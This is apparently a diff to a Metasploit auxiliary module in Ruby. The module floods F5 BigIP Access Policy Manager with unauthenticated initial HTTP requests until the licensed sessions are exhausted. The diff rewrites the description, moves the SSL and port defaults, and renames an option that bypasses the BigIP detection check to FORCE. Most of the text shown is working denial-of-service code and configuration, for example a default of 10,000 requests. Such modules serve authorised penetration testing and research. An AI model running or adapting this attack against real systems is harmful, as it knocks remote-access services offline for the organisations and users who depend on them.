@@ -11,14 +11,17 @@ class Metasploit3 < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'F5 BigIP APM Unauthenticated Session Exhaustion Denial of Service',
+      'Name'           => 'F5 BigIP Access Policy Manager Session Exhaustion Denial of Service',
       'Description'    => %q{
-        An unauthenticated attacker can establish multiple connections with BigIP Access Policy Manager
-        and exhaust all available sessions defined in customer\'s license.
-        In the first step of BigIP APM protocol the client sends a HTTP request.
-        The BigIP system creates a session, marks it as progress (pending) and then redirects client to access policy URI.
-        Since BigIP allocates a new session after the first unauthenticated request and deletes the session only if an access policy timeout will be expired
-        the attacker can exhaust all available sessions repeatedly sending initial HTTP request.
+        This module exploits a resource exhaustion denial of service in F5 BigIP devices. An
+        unauthenticated attacker can establish multiple connections with BigIP Access Policy
+        Manager (APM) and exhaust all available sessions defined in customer license. In the
+        first step of the BigIP APM negotiation the client sends a HTTP request. The BigIP
+        system creates a session, marks it as pending and then redirects the client to an access
+        policy URI. Since BigIP allocates a new session after the first unauthenticated request,
+        and deletes the session only if an access policy timeout expires, the attacker can exhaust
+        all available sessions by repeatedly sending the initial HTTP request and leaving the
+        sessions as pending.
       },
       'Author'         =>
         [
@@ -33,16 +36,16 @@ class Metasploit3 < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'DefaultOptions' =>
         {
-          'SSLVersion' => 'TLS1'
+          'SSL' => true,
+          'SSLVersion' => 'TLS1',
+          'RPORT' => 443
         }
     ))
 
     register_options(
       [
-        OptPort.new('RPORT', [true, 'The BigIP service port to listen on', 443]),
-        OptBool.new('SSL', [true, "Negotiate SSL for outgoing connections", true]),
         OptInt.new('RLIMIT', [true, 'The number of requests to send', 10000]),
-        OptBool.new('IGNOREMISMATCH', [true, 'Proceed with attack only if BigIP virtual server was detected', false]),
+        OptBool.new('FORCE', [true, 'Proceed with attack even if a BigIP virtual isn\'t detected', false])
       ], self.class)
   end
 
@@ -50,14 +53,14 @@ class Metasploit3 < Msf::Auxiliary
     # Main function
     rlimit = datastore['RLIMIT']
     proto = datastore['SSL'] ? 'https' : 'http'
-    ignore_mismatch = datastore['IGNOREMISMATCH']
+    force_attack = datastore['FORCE']
 
     # Send an initial test request
     res = send_request_cgi('method' => 'GET', 'uri' => '/')
     if res
       server = res.headers['Server']
       # Simple test based on HTTP Server header to detect BigIP virtual server
-      unless ignore_mismatch
+      unless force_attack
         if server !~ /BIG\-IP/ && server !~ /BigIP/
           print_error("#{peer} - BigIP virtual server was not detected. Please check options")
           return
